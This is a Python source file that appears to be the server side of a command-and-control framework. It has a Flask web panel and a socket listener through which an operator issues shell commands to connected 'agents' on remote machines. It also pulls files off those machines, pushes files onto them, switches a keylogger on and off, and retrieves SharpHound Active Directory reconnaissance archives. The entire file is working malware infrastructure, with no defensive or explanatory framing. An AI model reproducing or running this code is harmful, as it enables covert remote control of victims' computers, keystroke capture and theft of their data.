from concurrent.futures import thread
from os import close
import os
import re
import socket 
import threading,time,flask
from flask import *
from pathlib import Path
import base64
import time,random,string 
import zipfile


ip_address = '0.0.0.0'
port_number = 1234

thread_index = 0
THREADS = []
CMD_INPUT = []
CMD_OUTPUT = []
IPS = []
BUFFER_SIZE = 4096*10

for i in range(20):
    #THREADS.append('')
    CMD_INPUT.append('')
    CMD_OUTPUT.append('')
    IPS.append('')

app = Flask(__name__)

def close_connection(connection,thread_index):
    connection.close() 
    THREADS.remove(THREADS[thread_index])
    IPS[thread_index]=''
    CMD_INPUT[thread_index]=''
    CMD_OUTPUT[thread_index]=''

def handle_connection(connection,address,thread_index):
    global CMD_OUTPUT
    global CMD_INPUT
    
    
    while CMD_INPUT[thread_index]!='quit':
        #connection.settimeout(5)

        msg = connection.recv(BUFFER_SIZE).decode()
        #print("length of message is "+str(len(msg)))
        #while len(msg)==0 or msg!="Hello World":
            #msg = connection.recv(BUFFER_SIZE).decode()
        CMD_OUTPUT[thread_index] = msg
        while True:
            if CMD_INPUT[thread_index]!='':
                    
                if CMD_INPUT[thread_index].split(" ")[0]=='download':
                        #download filename
                        filename = CMD_INPUT[thread_index].split(" ")[1].split("\\")[-1]
                        print(filename)
                        cmd = CMD_INPUT[thread_index]
                        connection.send(cmd.encode())
                        connection.settimeout(7)
                        contents = connection.recv(BUFFER_SIZE*10000) 
                        connection.settimeout(None)
                        f = open(filename,'wb')
                        f.write(base64.b64decode(contents))
                        f.close()
                        #time.sleep(3)
                        CMD_OUTPUT[thread_index]='File Transferred successfully'
                        CMD_INPUT[thread_index]=''
                        #break
                    
                elif CMD_INPUT[thread_index].split(" ")[0]=='upload':
                        #upload filename dest 2048
                        cmd = CMD_INPUT[thread_index]
                        filename = CMD_INPUT[thread_index].split(" ")[1]
                        filesize = os.path.getsize('.\\output\\'+filename)
                        filesize += 1024
                        print(filesize)
                        CMD_INPUT[thread_index] += " "+str(filesize)
                        print(CMD_INPUT[thread_index])
                        connection.send(CMD_INPUT[thread_index].encode())
                        
                        destination = CMD_INPUT[thread_index].split(" ")[2]
                        #filesize = CMD_INPUT[thread_index].split(" ")[3]
                        
                        f = open('.\\output\\'+filename,'rb')
                        contents = f.read()
                        f.close()
                        connection.send(contents)
                        connection.settimeout(7)
                        msg = connection.recv(2048).decode()
                        connection.settimeout(None)
                        if msg =='got file':
                            CMD_OUTPUT[thread_index] = 'File Sent Successfully'
                            CMD_INPUT[thread_index]=''
                        else:
                            CMD_OUTPUT[thread_index]='Some Error Occurred'
                            CMD_INPUT[thread_index]='' 
                
                elif CMD_INPUT[thread_index]=="Get-SharpHoundZip":
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    #connection.settimeout(11)
                    contents = connection.recv(BUFFER_SIZE*5) 
                    print(len(contents))
                    #print(str(contents))
                    #connection.settimeout(None)
                    #print(len(contents))
                    filename = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
                    fd = open(".\\"+filename+".zip",'wb')
                    fd.write(contents)
                    fd.close()
                    #zf = zipfile.ZipFile(filename+".zip",'w')
                    #zf.wrirtestr(filename+".zip",contents)
                    #zf.close()
                    time.sleep(3)
                    contents2= connection.recv(BUFFER_SIZE)
                    #CMD_OUTPUT[thread_index]='File Transferred successfully'
                    CMD_INPUT[thread_index]=''


                elif CMD_INPUT[thread_index] == "keylog on":
                    cmd = CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(2048).decode()
                    CMD_OUTPUT[thread_index]=msg
                    CMD_INPUT[thread_index]=''
                
                elif CMD_INPUT[thread_index]=='keylog off':
                    cmd =CMD_INPUT[thread_index]
                    connection.send(cmd.encode())
                    msg = connection.recv(2048).decode()
                    CMD_OUTPUT[thread_index]=msg
                    CMD_INPUT[thread_index]=''

                else:
                    msg = CMD_INPUT[thread_index]
                    connection.send(msg.encode())
                    if msg=='quit':
                        CMD_INPUT[thread_index]='quit'
                    else:
                        CMD_INPUT[thread_index]=''
                    #msg = connection.recv(BUFFER_SIZE).decode()
                    #CMD_OUTPUT[thread_index] = msg
                    break
            
    close_connection(connection,thread_index)


    
def server_socket():
    ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    ss.bind((ip_address,port_number))
    ss.listen(5)
    #def init_server():
    global THREADS
    global IPS
    while True:
        connection , address = ss.accept()
        thread_index = len(THREADS)
        t = threading.Thread(target=handle_connection,args=(connection,address,len(THREADS)))
        THREADS.append(t)
        IPS[thread_index]=address
        t.start()


@app.before_first_request
def init_server():
    s1 = threading.Thread(target=server_socket)
    s1.start()



@app.route("/")
@app.route('/home')
def home():
    return render_template('index.html')


@app.route("/agents")
def agents():
    return render_template('agents.html',threads=THREADS,ips=IPS)


@app.route("/<agentname>/executecmd")
def executecmd(agentname):
    return render_template("execute.html",name=agentname)


@app.route("/<agentname>/execute",methods=['GET','POST'])
def execute(agentname):
    if request.method=='GET':
        counter = 0
        cmd = request.args.get('d')
        # Get-SharpHoundZip
        #print(cmd)
        for i in THREADS:
            if agentname in i.name:
                req_index = THREADS.index(i)
        prev = CMD_OUTPUT[req_index]
        CMD_INPUT[req_index]=cmd
        if cmd=="Get-SharpHoundZip":
            CMD_OUTPUT[req_index]="Trying to initiate transfer... If you get incorrect or less data, run it again"
            time.sleep(3)
            cmdoutput = CMD_OUTPUT[req_index]
            return render_template("execute.html",name=agentname,cmdoutput=cmdoutput)
        #time.sleep(5)
        cmdoutput = CMD_OUTPUT[req_index]
        while (prev==CMD_OUTPUT[req_index] and counter<6) or prev=="Hello World":
            time.sleep(0.5)
            counter+=1
        if counter>1:
            cmdoutput = CMD_OUTPUT[req_index]
        return render_template("execute.html",name=agentname,cmdoutput=cmdoutput)
    if request.method=='POST':
        cmd = request.form['command']
        counter = 0
        for i in THREADS:
            if agentname in i.name:
                req_index = THREADS.index(i)
        prev = CMD_OUTPUT[req_index]
        CMD_INPUT[req_index]=cmd
        if CMD_INPUT[req_index].split(" ")[0] in ["download","upload"]:
            time.sleep(6)
        time.sleep(1)
        cmdoutput = CMD_OUTPUT[req_index]
        while (prev==CMD_OUTPUT[req_index] and counter<6) or prev=="Hello World":
            time.sleep(0.5)
            counter+=1
        if counter>0:
            cmdoutput = CMD_OUTPUT[req_index]
        return render_template('execute.html',cmdoutput=cmdoutput,name=agentname,ips=IPS)


#@app.route("/<agentname")


@app.route("/temp",methods=['GET','POST'])
def temp():
    return render_template("temp.html")

if __name__=='__main__':
    app.run(debug=True)

